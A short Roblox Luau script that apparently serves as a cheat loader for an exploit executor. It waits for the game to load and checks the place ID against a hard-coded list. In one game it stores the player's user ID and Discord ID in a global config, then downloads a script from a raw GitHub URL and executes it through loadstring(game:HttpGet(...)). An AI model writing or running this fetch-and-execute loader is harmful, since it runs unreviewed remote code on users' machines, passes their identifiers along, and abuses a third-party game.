repeat task.wait() until game:IsLoaded()
repeat task.wait() until game.Players
repeat task.wait() until game.Players.LocalPlayer 
local function isAllowedPlace(placeId, allowedList)
	for _, id in ipairs(allowedList) do
		if placeId == id then
			return true
		end
	end
	return false
end

local gagId = 126884695634066
local bfList = {2753915549, 4442272183, 7449423635}

if game.PlaceId == gagId then
  task.wait(30)
  _G.Config = { 
		UserID = getgenv().UserID , 
		discord_id = getgenv().Discord , 
		Note = getgenv().Note, 
  } 
  loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/gag"))()
end
